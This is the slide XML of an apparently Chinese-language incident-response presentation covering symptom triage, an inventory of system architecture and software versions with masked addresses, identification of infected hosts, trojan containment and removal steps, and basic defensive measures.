              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="57346" name="图片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524558"/>
            <a:ext cx="8828700" cy="4718829"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>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0044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wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57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EA7B98-DBB9-4947-86D4-C6E5F5D72893}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1052736"/>
            <a:ext cx="3096344"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了解现状</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58370" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="594769" y="1673937"/>
            <a:ext cx="3576215" cy="224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了解目前什么情况：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>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安全设备告警？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>使用率突然很高？</a:t>
            </a:r>
          </a:p>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内网主机挂了？</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="标题 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39D203CF-A881-D144-8917-223A3F77A08F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4283968" y="2996952"/>
            <a:ext cx="4062384" cy="4873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itchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="457200" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="914400" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="1371600" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="1828800" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>了解“发病”时间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4283968" y="3573016"/>
            <a:ext cx="478802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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
              <a:defRPr kumimoji="1" sz="2400">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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设备告警最早发生时间？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>使用率突然很高的开始时间？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>主机宕机时间？</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25982569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8370"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="58370"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5837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8370" grpId="0"/>
      <p:bldP spid="4" grpId="0"/>
      <p:bldP spid="5" grpId="0"/>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EEAF2C-53D3-6040-AED4-CE7F01940100}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="908720"/>
            <a:ext cx="3600400"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了解系统架构</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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684992900"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="179512" y="1844824"/>
          <a:ext cx="8856984" cy="3960441"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="50800" dist="38100" dir="18900000" algn="bl" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2232248">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1322929008"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1459017">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2956290170"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1045709">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="224337783"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1110827">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="899224306"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="909091">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1908172016"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="910368">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3297907656"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1189724">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1307709502"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="690917">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系统名称</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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r>
                        <a:rPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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地址</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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端口开放</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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物理机</a:t>
                      </a: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a:t>
                      </a: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虚拟机</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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主机名</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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设备型号</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操作系统类型</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048778438"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="575252">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BIDW</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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（数据库）节点</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US"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01</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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10.2xx.xx.xx</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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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物理机</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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Bnnnn</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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IBM P595</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="14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AIX</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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986911079"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="573708">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操作系统版本</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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管理后台</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US"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IP</a:t>
                      </a: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地址</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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中间件类型</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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中间件版本</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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数据库类型</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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数据库版本</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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应用</a:t>
                      </a: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URL</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318144637"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="575252">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AIX 5.3</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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10.xx.xxx.79</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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was</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6.1.0.47</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oracle</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V11g</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gmcc.net</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2617697777"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="772656">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应用端口</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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储存设备类型</a:t>
                      </a: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储存设备型号</a:t>
                      </a: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web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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框架</a:t>
                      </a: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中间件版本</a:t>
                      </a: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第三方组件</a:t>
                      </a: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endParaRPr kumimoji="0" lang="zh-CN"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711441776"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="772656">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80</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="accent4"/>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磁带库</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3584/L52</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struts</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="16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编辑器</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3992613996"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7407034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2ED7F7-D9BC-2A4C-BECC-B7B52A917AD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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确认感染者</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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476051036"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="107504" y="2060848"/>
          <a:ext cx="8784976" cy="2440285"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="50800" dist="38100" dir="2700000" algn="tl" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1944216">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="200691661"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1440160">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3166232169"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1291228">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2322110034"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1095072">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="21089615"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="998076">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1287971031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1080120">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3035028381"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="936104">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1144018679"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="519210">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操作系统版本</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管理后台</a:t>
                      </a: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地址</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中间件类型</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中间件版本</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数据库类型</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数据库版本</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应用</a:t>
                      </a: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URL</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583099437"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="521805">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AIX 5.3</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10.xx.xxx.79</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was</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="14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6.1.0.47</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oracle</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V11g</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xxx.net</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2141874514"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="699635">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应用端口</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储存设备类型</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储存设备型号</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web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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框架</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中间件版本</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第三方组件</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3073809501"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="699635">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80</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磁带库</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3584/L52</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struts</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2.4</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编辑器</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416722424"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="755358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ou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9BC4AF-7478-C344-A107-4EF6883EDCA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584"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处置建议</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64514" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1259632" y="1700808"/>
            <a:ext cx="5171107"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断网或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>ACL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>隔离；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>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结束恶意进程；</a:t>
            </a:r>
          </a:p>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提取木马样本反馈</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>其他</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>专家；</a:t>
            </a:r>
          </a:p>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删除木马；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40286355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4514"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="64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6E0C26-2355-9341-BD1F-DE687CD0A2B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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防御措施</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65538" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="539552" y="1628800"/>
            <a:ext cx="8483475"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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安装</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>杀软</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
